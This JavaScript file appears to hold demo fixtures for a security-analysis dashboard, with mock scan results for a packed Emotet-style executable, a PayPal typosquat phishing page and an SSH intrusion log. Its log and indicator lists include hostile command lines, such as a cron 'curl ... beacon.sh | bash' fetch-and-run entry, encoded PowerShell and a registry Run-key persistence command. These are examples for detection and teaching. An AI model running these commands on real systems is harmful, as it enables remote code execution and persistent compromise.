export const D_FILE = {
  filename:"invoice_update_Q4.exe", size:"2.4 MB", type:"PE32 Executable (Windows x86, GUI)",
  md5:"a1b2c3d4e5f678901234567890abcdef",
  sha1:"abc123def456789012345678901234567890abcd12",
  sha256:"0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  entropy:7.82, packed:true, signed:false, vt_ratio:"61/72",
  sections:[{n:".text",e:7.91,s:true},{n:".data",e:6.23,s:false},{n:".rsrc",e:7.88,s:true},{n:".pdata",e:5.44,s:false},{n:".reloc",e:4.12,s:false}],
  imports:["CreateRemoteThread","VirtualAllocEx","WriteProcessMemory","LoadLibraryA","GetProcAddress","WinExec","URLDownloadToFile"],
  strings:[
    {v:"cmd.exe /c powershell -encodedCommand JABzAG...",sus:true},
    {v:"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",sus:true},
    {v:"http://185.220.101.47/payload.bin",sus:true},
    {v:"CreateRemoteThread",sus:true},
    {v:"VirtualAllocEx",sus:true},
    {v:"svchost32.exe",sus:true},
    {v:"kernel32.dll",sus:false},
    {v:"ntdll.dll",sus:false},
    {v:"VERSION.dll",sus:false},
  ],
  yara:["Trojan.Win32.Emotet.ABCD","Suspicious.PE.ProcessInjection","Malware.Packer.UPX.Modified","HEUR.Trojan.Win32.Generic"],
  risk:87, level:"CRITICAL",
  iocs:{
    ips:["185.220.101.47"],
    hashes:["a1b2c3d4e5f678901234567890abcdef","0123456789abcdef0123456789abcdef01234567"],
    reg_keys:["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32"],
    commands:["cmd.exe /c powershell -encodedCommand JABzAGUAcgB2AGUA","reg add HKLM\\Software\\CurrentVersion\\Run /v svchost32"],
    urls:["http://185.220.101.47/payload.bin","http://185.220.101.47/c2/beacon"],
    domains:[],emails:[],cves:[],
  },
  ai:`<span class="tc-b tc-r">THREAT CLASSIFICATION: Trojan Dropper / Credential Harvester (Emotet Family)</span><br/><br/>This executable carries <span class="tc-b tc-r">multiple high-confidence malware indicators</span> consistent with the <span class="tc-c">Emotet</span> banking trojan - one of the most prolific malware families, historically used to deliver TrickBot, Ryuk ransomware, and mass credential theft campaigns.<br/><br/><span class="tc-b tc-a">PROCESS INJECTION (T1055.001):</span> The classic injection triad - CreateRemoteThread + VirtualAllocEx + WriteProcessMemory - allocates memory inside a legitimate process (likely svchost.exe), writes shellcode, then executes it remotely.<br/><br/><span class="tc-b tc-a">REGISTRY PERSISTENCE (T1547.001):</span> Hardcoded path to HKLM\\CurrentVersion\\Run confirms AutoRun persistence. Registers as svchost32.exe under ProgramData - impersonates a legitimate system binary name.<br/><br/><span class="tc-b tc-a">PACKED / ENCRYPTED PAYLOAD (T1027):</span> Section entropy of 7.91 (.text) and 7.88 (.rsrc) approach the theoretical maximum of 8.0, confirming UPX-modified packing with a custom XOR decryption stub.<br/><br/><span class="tc-b tc-a">C2 COMMUNICATION (T1071.001):</span> Embedded IP 185.220.101.47 is a confirmed Emotet C2 server. Beacon pattern /c2/beacon is consistent with Emotet's HTTP polling.<br/><br/><span class="tc-b tc-r">IMMEDIATE: Quarantine host. Block 185.220.101.47 at firewall. DO NOT execute. Forensic image before remediation. Audit all lateral hosts for beaconing.</span>`
};

export const D_URL = {
  url:"https://secure-paypa1.com/login/verify?session=a9f3b",
  ip:"185.220.101.47", country:"RU RU", isp:"Frantech Solutions (Bulletproof Hosting)",
  domain_age:"3 days", registrar:"NameCheap (Privacy Protected)",
  ssl:{valid:false, issuer:"Self-signed", expiry:"2022-01-01"},
  redirects:["http://secure-paypa1.com -> https://secure-paypa1.com/login/verify"],
  tech:["PHP 5.6 (EOL)","Apache 2.2 (EOL)","No WAF","No CSP","No HSTS"],
  rep:{vt:23,urlscan:"Phishing",abuseipdb:94,phishtank:true},
  content:{
    login_form:true, pass_field:true,
    form_action:"http://185.220.101.47/collect.php",
    hidden_iframes:2, obfuscated_js:true,
    ext_scripts:["http://185.220.101.47/tracker.js"],
  },
  checks:[
    {n:"SSL Certificate",v:"Self-signed / Expired (2022)",ok:false},
    {n:"Domain Age",v:"3 days - newly registered",ok:false},
    {n:"VirusTotal",v:"23/80 vendors flagged",ok:false},
    {n:"PhishTank",v:"Confirmed active phishing",ok:false},
    {n:"AbuseIPDB",v:"94 abuse reports on host IP",ok:false},
    {n:"Typosquatting",v:"'paypa1' impersonates PayPal",ok:false},
    {n:"Login Form Action",v:"Exfiltrates creds to bare IP",ok:false},
    {n:"Hidden IFrames",v:"2 zero-size iframes detected",ok:false},
    {n:"Obfuscated JavaScript",v:"eval/atob/unescape detected",ok:false},
    {n:"HTTPS Enforced",v:"Yes (invalid cert)",ok:null},
    {n:"HSTS Header",v:"Missing",ok:false},
    {n:"Content-Security-Policy",v:"Missing",ok:false},
  ],
  injections:[
    {sev:"critical",icon:"💉",title:"Credential Harvesting Form",detail:"Login form POSTs username + password directly to http://185.220.101.47/collect.php - an attacker-controlled server."},
    {sev:"critical",icon:"📜",title:"Obfuscated Malicious JavaScript",detail:"eval(atob(unescape('...'))) pattern detected - multi-layer obfuscation hiding browser fingerprinting code."},
    {sev:"critical",icon:"🪟",title:"Hidden IFrame Injection (x2)",detail:"Two zero-size iframes found pointing to external origins. Used for invisible content loading."},
    {sev:"warn",icon:"📡",title:"External Malicious Tracking Script",detail:"http://185.220.101.47/tracker.js loaded from the same C2 IP."},
    {sev:"warn",icon:"🔒",title:"Missing Security Headers",detail:"No Content-Security-Policy, no HSTS, no X-Frame-Options."},
  ],
  vulns:[
    {sev:"critical",name:"Outdated Server Stack - PHP 5.6 / Apache 2.2",cve:"Multiple CVEs",evidence:"Server: Apache/2.2",fix:"Upgrade to PHP 8.2+"},
    {sev:"high",name:"Missing Content Security Policy (CSP)",cve:"CWE-693",evidence:"No CSP header.",fix:"Implement strict CSP"},
    {sev:"high",name:"Missing HTTP Strict Transport Security",cve:"CWE-523",evidence:"No HSTS header.",fix:"Add: Strict-Transport-Security"},
  ],
  health:{total:8,ssl:0,malware:0,vulns:10,rep:5,content:15},
  risk:96, level:"CRITICAL",
  iocs:{
    ips:["185.220.101.47"],
    domains:["secure-paypa1.com"],
    urls:["http://185.220.101.47/collect.php","http://185.220.101.47/tracker.js"],
    emails:[],hashes:[],reg_keys:[],commands:[],cves:["CWE-693","CWE-523","CWE-295"],
  },
  url_timeline:[],
  ai:"Active Phishing Campaign Targeting PayPal Users."
};

export const D_LOG = {
  lines:12847, suspicious:34, critical:8, anomalies:5,
  risk:72, level:"HIGH",
  timeline:[
    {t:"2024-11-28 02:14:33",e:"SSH Brute Force Begins",d:"894 failed login attempts from 185.220.101.47.",sev:"high"},
    {t:"2024-11-28 02:22:11",e:"Successful Authentication",d:"SSH login accepted for user 'ubuntu'.",sev:"critical"},
    {t:"2024-11-28 02:22:45",e:"Privilege Escalation via sudo",d:"sudo -i executed. User escalated to root.",sev:"critical"},
    {t:"2024-11-28 02:23:01",e:"Cron Persistence Established",d:"Cron job added for persistent root execution.",sev:"critical"},
    {t:"2024-11-28 02:24:18",e:"C2 Beacon Confirmed",d:"Outbound HTTP GET to C2 IP established.",sev:"critical"},
  ],
  iocs:{
    ips:["185.220.101.47"],
    commands:["sudo -i","curl http://185.220.101.47/beacon.sh | bash"],
    urls:[],hashes:[],domains:[],emails:[],reg_keys:[],cves:[],
  },
  ai:"Full Intrusion Lifecycle Detected."
};

export const HISTORY = [
  {id:"s001",type:"file",name:"invoice_update_Q4.exe",level:"critical",risk:87,date:"2024-11-30 14:22",findings:4,iocs:9},
  {id:"s002",type:"url",name:"secure-paypa1.com",level:"critical",risk:96,date:"2024-11-30 14:08",findings:12,iocs:6},
  {id:"s003",type:"log",name:"access_logs_nov.txt",level:"critical",risk:72,date:"2024-11-30 13:10",findings:8,iocs:7},
  {id:"s004",type:"file",name:"company_logo.png",level:"clean",risk:2,date:"2024-11-30 12:44",findings:0,iocs:0},
  {id:"s005",type:"file",name:"suspicious_update.js",level:"high",risk:68,date:"2024-11-30 11:30",findings:3,iocs:4},
  {id:"s006",type:"url",name:"http://malware-cdn.ru/payload",level:"critical",risk:94,date:"2024-11-29 22:15",findings:9,iocs:5},
];

export const ATTACK_CHAIN = {
  name:"Emotet Intrusion - Full Kill Chain",
  target:"invoice_update_Q4.exe - 2024-11-30",
  risk:87, level:"CRITICAL",
  phases:[
    {phase:"Initial Access",tactic:"T1566.001",technique:"Phishing Attachment",detail:"Victim received email with invoice_update_Q4.exe.",sev:"critical",icon:"📧"},
    {phase:"Execution",tactic:"T1059.001",technique:"PowerShell Execution",detail:"Dropper runs powershell -encodedCommand.",sev:"critical",icon:"⚡"},
    {phase:"Defense Evasion",tactic:"T1027",technique:"Packed / Obfuscated Binary",detail:"UPX-modified packing detected.",sev:"high",icon:"🛡"},
    {phase:"Persistence",tactic:"T1547.001",technique:"Registry AutoRun Key",detail:"Writes svchost32.exe to Run key.",sev:"critical",icon:"⚙"},
    {phase:"Process Injection",tactic:"T1055.001",technique:"Remote Thread Injection",detail:"Injects DLL into svchost.exe.",sev:"critical",icon:"💉"},
    {phase:"Command & Control",tactic:"T1071.001",technique:"HTTP C2 Beacon",detail:"Periodic HTTP GET to C2 IP.",sev:"critical",icon:"📡"},
  ],
  iocs:{
    ips:["185.220.101.47"],
    domains:[],
    hashes:["a1b2c3d4e5f678901234567890abcdef"],
    reg_keys:["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32"],
    commands:[],urls:[],emails:[],cves:[],
  }
};

export const FILE_STEPS=[
  {label:"Extracting file metadata",dur:550},
  {label:"Computing hashes",dur:700},
  {label:"Entropy analysis",dur:900},
  {label:"PE header analysis",dur:650},
  {label:"String extraction",dur:800},
  {label:"YARA signatures",dur:1100},
  {label:"AI threat classification",dur:1500},
];

export const URL_STEPS=[
  {label:"Resolving DNS",dur:500},
  {label:"SSL validation",dur:600},
  {label:"Reputation lookup",dur:950},
  {label:"Parsing content",dur:800},
  {label:"AI threat explanation",dur:1400},
];

export const LOG_STEPS=[
  {label:"Parsing log format",dur:600},
  {label:"Detecting brute force",dur:750},
  {label:"AI attack chain reconstruction",dur:1500},
];

export const DEMO_LOGS = `2024-11-28 02:14:33 sshd[2341]: Failed password for root from 185.220.101.47 port 44231 ssh2
2024-11-28 02:22:11 sshd[2398]: Accepted password for ubuntu from 185.220.101.47 port 49102 ssh2
2024-11-28 02:22:45 sudo[2401]: ubuntu : COMMAND=/bin/bash -i
2024-11-28 02:23:01 cron[2410]: (root) ADD (*/5 * * * * curl http://185.220.101.47/beacon.sh | bash)`;

export const NAV = [
  { section:"Main", items:[
    { id:"dashboard", icon:"🏠", label:"Dashboard" },
    { id:"history",   icon:"📜", label:"Scan History" },
  ]},
  { section:"Analysis", items:[
    { id:"file-scan", icon:"🔍", label:"File Scanner" },
    { id:"url-scan",  icon:"🌐", label:"URL Scanner" },
    { id:"log-scan",  icon:"📄", label:"Log Analyzer" },
  ]},
  { section:"Investigation", items:[
    { id:"ioc",      icon:"🧪", label:"IOC Extractor" },
    { id:"timeline", icon:"🕵️", label:"Attack Timeline" },
    { id:"intel",    icon:"🌍", label:"Threat Intel" },
  ]},
  { section:"Platform", items:[
    { id:"reports",  icon:"📑", label:"Reports", badge:"6" },
    { id:"settings", icon:"⚙️",  label:"Settings" },
  ]},
];

export const TITLES = {
  dashboard:"Dashboard",
  history:"Scan History",
  "file-scan":"File Scanner",
  "url-scan":"URL Scanner",
  "log-scan":"Log Analyzer",
  ioc:"IOC Extractor",
  timeline:"Attack Timeline",
  intel:"Threat Intelligence",
  reports:"Reports",
  settings:"Settings",
};

export const API_STORAGE_KEY = "ghosttrace.settings.apiKeys.v1";
export const SETTINGS_STORAGE_KEY = "ghosttrace.settings.toggles.v1";

export const DEMO_IOC_TEXT = `Incident report - 2024-11-28:
Host 10.0.0.5 contacted 185.220.101.47 over port 443.
Domain evil-c2-server.com used for command and control.
File hash: a1b2c3d4e5f678901234567890abcdef found in memory dump.
SHA256: 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
Attacker email: attacker@malicious-actor.ru
Dropper: http://185.220.101.47/payload.exe
PowerShell: cmd.exe /c powershell -nop -w hidden -encodedCommand JABz...
Registry: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost32
CVE-2021-34527 exploited for privilege escalation.
Second stage: https://malware-cdn.ru/stage2.bin`;
